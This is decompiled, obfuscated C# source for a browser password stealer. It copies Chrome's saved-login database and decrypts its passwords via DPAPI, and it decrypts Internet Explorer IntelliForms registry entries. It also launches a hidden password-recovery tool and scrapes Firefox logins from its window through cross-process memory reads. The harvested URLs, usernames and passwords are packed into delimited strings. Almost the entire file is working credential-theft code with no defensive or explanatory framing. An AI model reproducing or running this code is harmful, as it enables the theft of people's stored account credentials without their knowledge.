using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.Common;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

public class GClass2
{
	public enum GEnum1
	{
		Execute = 16,
		ExecuteRead = 32,
		ExecuteReadWrite = 64,
		ExecuteWriteCopy = 128,
		NoAccess = 1,
		ReadOnly = 2,
		ReadWrite = 4,
		WriteCopy = 8,
		GuardModifierflag = 256,
		NoCacheModifierflag = 512,
		WriteCombineModifierflag = 1024
	}

	public enum GEnum2
	{
		Commit = 4096,
		Reserve = 8192,
		Decommit = 16384,
		Release = 32768,
		Reset = 524288,
		Physical = 4194304,
		TopDown = 1048576,
		WriteWatch = 2097152,
		LargePages = 536870912
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct0
	{
		public uint uint_0;

		public int int_0;

		public int int_1;

		public uint uint_1;

		public uint uint_2;

		public IntPtr intptr_0;

		public int int_2;

		public int int_3;

		public IntPtr intptr_1;
	}

	public enum GEnum3 : uint
	{
		All = 2035711u,
		Terminate = 1u,
		CreateThread = 2u,
		VirtualMemoryOperation = 8u,
		VirtualMemoryRead = 16u,
		VirtualMemoryWrite = 32u,
		DuplicateHandle = 64u,
		CreateProcess = 128u,
		SetQuota = 256u,
		SetInformation = 512u,
		QueryInformation = 1024u,
		QueryLimitedInformation = 4096u,
		Synchronize = 1048576u
	}

	public enum GEnum4
	{
		Decommit = 0x4000,
		Release = 0x8000
	}

	private struct Struct1
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;
	}

	private struct Struct2
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public Struct1 struct1_0;
	}

	[StructLayout(LayoutKind.Explicit)]
	private struct Struct3
	{
		[FieldOffset(0)]
		public uint uint_0;

		[FieldOffset(4)]
		public byte byte_0;

		[FieldOffset(5)]
		public byte byte_1;

		[FieldOffset(6)]
		public byte byte_2;

		[FieldOffset(7)]
		public byte byte_3;

		[FieldOffset(8)]
		public byte byte_4;

		[FieldOffset(9)]
		public byte byte_5;

		[FieldOffset(10)]
		public byte byte_6;

		[FieldOffset(11)]
		public byte byte_7;

		[FieldOffset(12)]
		public uint uint_1;
	}

	public enum GEnum5
	{
		CALG_MD5 = 32771,
		CALG_SHA1
	}

	private enum Enum3
	{
		HP_ALGID = 1,
		HP_HASHVAL = 2,
		HP_HASHSIZE = 4
	}

	private const int int_0 = 4096;

	private const int int_1 = 4100;

	private const int int_2 = 4211;

	private const int int_3 = 1;

	private const int int_4 = 13;

	private const int int_5 = 7;

	private const int int_6 = 1;

	private const int int_7 = 0;

	private const int int_8 = 0;

	private const int int_9 = 0;

	public const string string_0 = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

	private const uint uint_0 = 1u;

	private const uint uint_1 = 4026531840u;

	private const int int_10 = 32768;

	private const int int_11 = 4;

	private const string string_1 = "SOFTWARE\\Mozilla\\Mozilla Firefox";

	private bool bool_0;

	private bool bool_1;

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_2, string string_3);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_2, string string_3);

	[DllImport("user32.dll", CharSet = CharSet.Ansi)]
	private static extern IntPtr SendMessageA(IntPtr intptr_0, int int_12, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(GEnum3 genum3_0, bool bool_2, int int_12);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, GEnum2 genum2_0, GEnum1 genum1_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, uint uint_2, UIntPtr uintptr_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr intptr_0, IntPtr intptr_1, [Out] byte[] byte_0, int int_12, out IntPtr intptr_2);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, int int_12, GEnum4 genum4_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr intptr_0);

	public string[] method_0()
	{
		List<string> list = new List<string>();
		string[] array = method_5();
		string[] array2 = method_8();
		StringBuilder stringBuilder = GClass2.smethod_0();
		for (int i = 0; i < array.Length; i++)
		{
			string string_ = array[i];
			if (i + 1 != array.Length)
			{
				GClass2.smethod_1(GClass2.smethod_1(stringBuilder, string_), "\n");
			}
			else
			{
				GClass2.smethod_1(stringBuilder, string_);
			}
		}
		list.Add(GClass2.smethod_2((object)stringBuilder));
		GClass2.smethod_3(stringBuilder);
		list.Add(GClass2.smethod_2((object)stringBuilder));
		GClass2.smethod_3(stringBuilder);
		for (int j = 0; j < array2.Length; j++)
		{
			string string_2 = array2[j];
			if (j + 1 != array2.Length)
			{
				GClass2.smethod_1(GClass2.smethod_1(stringBuilder, string_2), "\n");
			}
			else
			{
				GClass2.smethod_1(stringBuilder, string_2);
			}
		}
		list.Add(GClass2.smethod_2((object)stringBuilder));
		GClass2.smethod_3(stringBuilder);
		stringBuilder = null;
		return list.ToArray();
	}

	public bool method_1(string string_2, List<string[]> list_0)
	{
		string string_3 = method_2(string_2);
		if (method_3(string_3))
		{
			RegistryKey registryKey = GClass2.smethod_4(Registry.CurrentUser, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2");
			if (registryKey != null)
			{
				byte[] byte_ = (byte[])GClass2.smethod_5(registryKey, string_3);
				GClass2.smethod_6(registryKey);
				byte[] array = new byte[2 * (GClass2.smethod_7(string_2) + 1)];
				GClass2.smethod_9((Array)GClass2.smethod_8(string_2), 0, (Array)array, 0, GClass2.smethod_7(string_2) * 2);
				byte[] array2 = GClass2.smethod_10(byte_, array, (DataProtectionScope)0);
				Struct2 @struct = method_4<Struct2>(array2);
				if (array2.Length >= @struct.uint_0 + @struct.uint_1 + @struct.uint_2)
				{
					uint num = @struct.struct1_0.uint_2 / 2u;
					int num2 = GClass2.smethod_12(GClass2.smethod_11(typeof(Struct3).TypeHandle));
					byte[] array3 = new byte[@struct.uint_2];
					int int_ = (int)(@struct.uint_0 + @struct.uint_1);
					GClass2.smethod_9((Array)array2, int_, (Array)array3, 0, array3.Length);
					if (list_0 != null)
					{
						list_0.Clear();
					}
					else
					{
						list_0 = new List<string[]>();
					}
					int_ = GClass2.smethod_13((object)@struct);
					for (int i = 0; i < num; i++)
					{
						byte[] array4 = new byte[num2];
						GClass2.smethod_9((Array)array2, int_, (Array)array4, 0, array4.Length);
						Struct3 struct2 = method_4<Struct3>(array4);
						string[] array5 = new string[3];
						byte[] array6 = new byte[struct2.uint_1 * 2];
						GClass2.smethod_9((Array)array3, (int)struct2.uint_0, (Array)array6, 0, array6.Length);
						array5[0] = GClass2.smethod_15(GClass2.smethod_14(), array6);
						int_ += num2;
						GClass2.smethod_9((Array)array2, int_, (Array)array4, 0, array4.Length);
						struct2 = method_4<Struct3>(array4);
						byte[] array7 = new byte[struct2.uint_1 * 2];
						GClass2.smethod_9((Array)array3, (int)struct2.uint_0, (Array)array7, 0, array7.Length);
						array5[1] = GClass2.smethod_15(GClass2.smethod_14(), array7);
						array5[2] = string_2;
						list_0.Add(array5);
						int_ += num2;
					}
				}
				return true;
			}
			return false;
		}
		return false;
	}

	public string method_2(string string_2)
	{
		IntPtr intptr_ = IntPtr.Zero;
		IntPtr intptr_2 = IntPtr.Zero;
		CryptAcquireContext(out intptr_, string.Empty, string.Empty, 1u, 4026531840u);
		if (CryptCreateHash(intptr_, GEnum5.CALG_SHA1, IntPtr.Zero, 0u, ref intptr_2))
		{
			byte[] byte_ = GClass2.smethod_18(GClass2.smethod_14(), string_2);
			StringBuilder stringBuilder = GClass2.smethod_19(42);
			if (CryptHashData(intptr_2, byte_, (uint)((GClass2.smethod_7(string_2) + 1) * 2), 0u))
			{
				uint uint_ = 20u;
				byte[] array = new byte[20];
				if (!CryptGetHashParam(intptr_2, Enum3.HP_HASHVAL, array, ref uint_, 0u))
				{
					throw GClass2.smethod_17(GClass2.smethod_16());
				}
				byte b = 0;
				GClass2.smethod_20(stringBuilder, 0);
				for (int i = 0; i < uint_; i++)
				{
					byte b2 = array[i];
					b = (byte)(b + b2);
					GClass2.smethod_21(stringBuilder, "{0:X2}", (object)b2);
				}
				GClass2.smethod_21(stringBuilder, "{0:X2}", (object)b);
				CryptDestroyHash(intptr_2);
			}
			CryptReleaseContext(intptr_, 0);
			return GClass2.smethod_2((object)stringBuilder);
		}
		throw GClass2.smethod_17(GClass2.smethod_16());
	}

	public bool method_3(string string_2)
	{
		bool result = false;
		RegistryKey registryKey = GClass2.smethod_4(Registry.CurrentUser, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2");
		if (registryKey == null)
		{
			return false;
		}
		string[] array = GClass2.smethod_22(registryKey);
		for (int i = 0; i < array.Length; i++)
		{
			if (GClass2.smethod_23(array[i], string_2))
			{
				result = true;
				break;
			}
		}
		return result;
	}

	public T method_4<T>(byte[] byte_0) where T : struct
	{
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		T result = (T)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), typeof(T));
		gCHandle.Free();
		return result;
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptAcquireContext(out IntPtr intptr_0, string string_2, string string_3, uint uint_2, uint uint_3);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CryptCreateHash(IntPtr intptr_0, GEnum5 genum5_0, IntPtr intptr_1, uint uint_2, ref IntPtr intptr_2);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CryptHashData(IntPtr intptr_0, byte[] byte_0, uint uint_2, uint uint_3);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptGetHashParam(IntPtr intptr_0, Enum3 enum3_0, [Out] byte[] byte_0, ref uint uint_2, uint uint_3);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool CryptDestroyHash(IntPtr intptr_0);

	[DllImport("Advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool CryptReleaseContext(IntPtr intptr_0, int int_12);

	public string[] method_5()
	{
		string string_ = GClass2.smethod_25(GClass2.smethod_24(Environment.SpecialFolder.LocalApplicationData), "\\Google\\Chrome\\User Data\\Default\\Login Data");
		string text = GClass2.smethod_25(GClass2.smethod_26(), "\\logindata");
		if (GClass2.smethod_27(text))
		{
			GClass2.smethod_28(text);
		}
		if (GClass2.smethod_27(string_))
		{
			GClass2.smethod_29(string_, text);
			List<string> list = new List<string>();
			string string_2 = "SELECT username_value, password_value, origin_url FROM logins WHERE blacklisted_by_user = 0";
			SQLiteConnection val = GClass2.smethod_30("Data Source=logindata;Version=3;");
			try
			{
				GClass2.smethod_31((DbConnection)(object)val);
				SQLiteCommand val2 = GClass2.smethod_32(string_2, val);
				try
				{
					SQLiteDataReader val3 = GClass2.smethod_33(val2);
					try
					{
						while (GClass2.smethod_38((DbDataReader)(object)val3))
						{
							string text2 = GClass2.smethod_35(GClass2.smethod_34((DbDataReader)(object)val3, "username_value"));
							byte[] byte_ = (byte[])GClass2.smethod_36((DbDataReader)(object)val3, 1);
							string text3 = method_6(byte_);
							string text4 = GClass2.smethod_35(GClass2.smethod_34((DbDataReader)(object)val3, "origin_url"));
							string item = GClass2.smethod_37(new string[5] { text4, "§", text2, "§", text3 });
							list.Add(item);
						}
					}
					finally
					{
						if (val3 != null)
						{
							GClass2.smethod_39((IDisposable)val3);
						}
					}
				}
				finally
				{
					if (val2 != null)
					{
						GClass2.smethod_39((IDisposable)val2);
					}
				}
			}
			finally
			{
				if (val != null)
				{
					GClass2.smethod_39((IDisposable)val);
				}
			}
			if (list.Count == 0)
			{
				list.Add("failed");
			}
			return list.ToArray();
		}
		return new string[1] { "failed" };
	}

	public string method_6(byte[] byte_0)
	{
		byte[] byte_ = GClass2.smethod_10(byte_0, (byte[])null, (DataProtectionScope)0);
		return GClass2.smethod_15(GClass2.smethod_40(), byte_);
	}

	private bool method_7()
	{
		if (bool_1)
		{
			return bool_0;
		}
		RegistryKey registryKey = GClass2.smethod_4(Registry.LocalMachine, "SOFTWARE\\Mozilla\\Mozilla Firefox");
		bool_0 = registryKey != null;
		bool_1 = true;
		return bool_0;
	}

	public string[] method_8()
	{
		if (!method_7())
		{
			return new string[1] { "failed" };
		}
		ProcessStartInfo processStartInfo = GClass2.smethod_41();
		GClass2.smethod_42(processStartInfo, ProcessWindowStyle.Hidden);
		GClass2.smethod_43(processStartInfo, "ff.exe");
		ProcessStartInfo processStartInfo_ = processStartInfo;
		Process process = GClass2.smethod_44();
		GClass2.smethod_45(process, processStartInfo_);
		Process process_ = process;
		GClass2.smethod_46(process_);
		GClass2.smethod_47(3000);
		IntPtr intptr_ = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "PasswordFox", null);
		IntPtr intptr_2 = method_13(intptr_, 2);
		int num = method_9(intptr_2);
		List<string> list = new List<string>();
		if (num == 0)
		{
			GClass2.smethod_48(process_);
			return new string[1] { "failed" };
		}
		StringBuilder stringBuilder = GClass2.smethod_0();
		for (int i = 0; i < num; i++)
		{
			for (int j = 0; j < 13; j++)
			{
				string string_ = method_10(j, i, "ff", intptr_2);
				GClass2.smethod_1(stringBuilder, string_);
				if (j + 1 != 13)
				{
					GClass2.smethod_1(stringBuilder, "§");
				}
			}
			list.Add(GClass2.smethod_2((object)stringBuilder));
			GClass2.smethod_3(stringBuilder);
		}
		stringBuilder = null;
		GClass2.smethod_48(process_);
		return list.ToArray();
	}

	private int method_9(IntPtr intptr_0)
	{
		return SendMessageA(intptr_0, 4100, IntPtr.Zero, IntPtr.Zero).ToInt32();
	}

	private string method_10(int int_12, int int_13, string string_2, IntPtr intptr_0)
	{
		IntPtr intptr_ = (IntPtr)512;
		int int_14 = GClass2.smethod_50(GClass2.smethod_49(string_2)[0]);
		IntPtr intptr_2 = OpenProcess((GEnum3)56u, bool_2: false, int_14);
		IntPtr intPtr = VirtualAllocEx(intptr_2, (IntPtr)0, intptr_, GEnum2.Commit, GEnum1.ReadWrite);
		Struct0 @struct = default(Struct0);
		@struct.uint_0 = 1u;
		@struct.int_2 = intptr_.ToInt32();
		@struct.int_1 = int_12;
		@struct.intptr_0 = intPtr;
		Struct0 struct2 = @struct;
		IntPtr intPtr2 = VirtualAllocEx(intptr_2, (IntPtr)0, (IntPtr)Marshal.SizeOf((object)struct2), GEnum2.Commit, GEnum1.ReadWrite);
		method_11(intptr_2, intPtr2, struct2);
		IntPtr intPtr3 = SendMessageA(intptr_0, 4211, (IntPtr)int_13, intPtr2);
		byte[] array = new byte[intPtr3.ToInt32() * 2];
		IntPtr intptr_3 = IntPtr.Zero;
		ReadProcessMemory(intptr_2, intPtr, array, intPtr3.ToInt32() * 2, out intptr_3);
		string @string = Encoding.Unicode.GetString(array);
		VirtualFreeEx(intptr_2, intPtr, 0, GEnum4.Release);
		VirtualFreeEx(intptr_2, intPtr2, 0, GEnum4.Release);
		CloseHandle(intptr_2);
		return @string;
	}

	private void method_11(IntPtr intptr_0, IntPtr intptr_1, Struct0 struct0_0)
	{
		uint num = (uint)GClass2.smethod_12(GClass2.smethod_11(typeof(Struct0).TypeHandle));
		IntPtr intPtr = GClass2.smethod_51((int)num);
		GClass2.smethod_52((object)struct0_0, intPtr, bool_2: true);
		WriteProcessMemory(intptr_0, intptr_1, intPtr, num, UIntPtr.Zero);
	}

	private byte[] method_12(Struct0 struct0_0)
	{
		int num = GClass2.smethod_13((object)struct0_0);
		byte[] array = new byte[num];
		IntPtr intptr_ = GClass2.smethod_51(num);
		GClass2.smethod_52((object)struct0_0, intptr_, bool_2: true);
		GClass2.smethod_53(intptr_, array, 0, num);
		GClass2.smethod_54(intptr_);
		return array;
	}

	private IntPtr method_13(IntPtr intptr_0, int int_12)
	{
		IntPtr intPtr = IntPtr.Zero;
		int num = 0;
		while (true)
		{
			intPtr = ((num == 0) ? FindWindowEx(intptr_0, (IntPtr)0, null, null) : FindWindowEx(intptr_0, intPtr, null, null));
			if (num == int_12)
			{
				break;
			}
			num++;
		}
		return intPtr;
	}

	static StringBuilder smethod_0()
	{
		return new StringBuilder();
	}

	static StringBuilder smethod_1(StringBuilder stringBuilder_0, string string_2)
	{
		return stringBuilder_0.Append(string_2);
	}

	static string smethod_2(object object_0)
	{
		return object_0.ToString();
	}

	static StringBuilder smethod_3(StringBuilder stringBuilder_0)
	{
		return stringBuilder_0.Clear();
	}

	static RegistryKey smethod_4(RegistryKey registryKey_0, string string_2)
	{
		return registryKey_0.OpenSubKey(string_2);
	}

	static object smethod_5(RegistryKey registryKey_0, string string_2)
	{
		return registryKey_0.GetValue(string_2);
	}

	static void smethod_6(RegistryKey registryKey_0)
	{
		registryKey_0.Close();
	}

	static int smethod_7(string string_2)
	{
		return string_2.Length;
	}

	static char[] smethod_8(string string_2)
	{
		return string_2.ToCharArray();
	}

	static void smethod_9(Array array_0, int int_12, Array array_1, int int_13, int int_14)
	{
		Buffer.BlockCopy(array_0, int_12, array_1, int_13, int_14);
	}

	static byte[] smethod_10(byte[] byte_0, byte[] byte_1, DataProtectionScope dataProtectionScope_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return ProtectedData.Unprotect(byte_0, byte_1, dataProtectionScope_0);
	}

	static Type smethod_11(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static int smethod_12(Type type_0)
	{
		return Marshal.SizeOf(type_0);
	}

	static int smethod_13(object object_0)
	{
		return Marshal.SizeOf(object_0);
	}

	static Encoding smethod_14()
	{
		return Encoding.Unicode;
	}

	static string smethod_15(Encoding encoding_0, byte[] byte_0)
	{
		return encoding_0.GetString(byte_0);
	}

	static int smethod_16()
	{
		return Marshal.GetLastWin32Error();
	}

	static Win32Exception smethod_17(int int_12)
	{
		return new Win32Exception(int_12);
	}

	static byte[] smethod_18(Encoding encoding_0, string string_2)
	{
		return encoding_0.GetBytes(string_2);
	}

	static StringBuilder smethod_19(int int_12)
	{
		return new StringBuilder(int_12);
	}

	static void smethod_20(StringBuilder stringBuilder_0, int int_12)
	{
		stringBuilder_0.Length = int_12;
	}

	static StringBuilder smethod_21(StringBuilder stringBuilder_0, string string_2, object object_0)
	{
		return stringBuilder_0.AppendFormat(string_2, object_0);
	}

	static string[] smethod_22(RegistryKey registryKey_0)
	{
		return registryKey_0.GetValueNames();
	}

	static bool smethod_23(string string_2, string string_3)
	{
		return string_2 == string_3;
	}

	static string smethod_24(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	static string smethod_25(string string_2, string string_3)
	{
		return string_2 + string_3;
	}

	static string smethod_26()
	{
		return Application.get_StartupPath();
	}

	static bool smethod_27(string string_2)
	{
		return File.Exists(string_2);
	}

	static void smethod_28(string string_2)
	{
		File.Delete(string_2);
	}

	static void smethod_29(string string_2, string string_3)
	{
		File.Copy(string_2, string_3);
	}

	static SQLiteConnection smethod_30(string string_2)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SQLiteConnection(string_2);
	}

	static void smethod_31(DbConnection dbConnection_0)
	{
		dbConnection_0.Open();
	}

	static SQLiteCommand smethod_32(string string_2, SQLiteConnection sqliteConnection_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new SQLiteCommand(string_2, sqliteConnection_0);
	}

	static SQLiteDataReader smethod_33(SQLiteCommand sqliteCommand_0)
	{
		return sqliteCommand_0.ExecuteReader();
	}

	static object smethod_34(DbDataReader dbDataReader_0, string string_2)
	{
		return dbDataReader_0[string_2];
	}

	static string smethod_35(object object_0)
	{
		return Convert.ToString(object_0);
	}

	static object smethod_36(DbDataReader dbDataReader_0, int int_12)
	{
		return dbDataReader_0.GetValue(int_12);
	}

	static string smethod_37(string[] string_2)
	{
		return string.Concat(string_2);
	}

	static bool smethod_38(DbDataReader dbDataReader_0)
	{
		return dbDataReader_0.Read();
	}

	static void smethod_39(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Encoding smethod_40()
	{
		return Encoding.UTF8;
	}

	static ProcessStartInfo smethod_41()
	{
		return new ProcessStartInfo();
	}

	static void smethod_42(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0)
	{
		processStartInfo_0.WindowStyle = processWindowStyle_0;
	}

	static void smethod_43(ProcessStartInfo processStartInfo_0, string string_2)
	{
		processStartInfo_0.FileName = string_2;
	}

	static Process smethod_44()
	{
		return new Process();
	}

	static void smethod_45(Process process_0, ProcessStartInfo processStartInfo_0)
	{
		process_0.StartInfo = processStartInfo_0;
	}

	static bool smethod_46(Process process_0)
	{
		return process_0.Start();
	}

	static void smethod_47(int int_12)
	{
		Thread.Sleep(int_12);
	}

	static void smethod_48(Process process_0)
	{
		process_0.Kill();
	}

	static Process[] smethod_49(string string_2)
	{
		return Process.GetProcessesByName(string_2);
	}

	static int smethod_50(Process process_0)
	{
		return process_0.Id;
	}

	static IntPtr smethod_51(int int_12)
	{
		return Marshal.AllocHGlobal(int_12);
	}

	static void smethod_52(object object_0, IntPtr intptr_0, bool bool_2)
	{
		Marshal.StructureToPtr(object_0, intptr_0, bool_2);
	}

	static void smethod_53(IntPtr intptr_0, byte[] byte_0, int int_12, int int_13)
	{
		Marshal.Copy(intptr_0, byte_0, int_12, int_13);
	}

	static void smethod_54(IntPtr intptr_0)
	{
		Marshal.FreeHGlobal(intptr_0);
	}
}
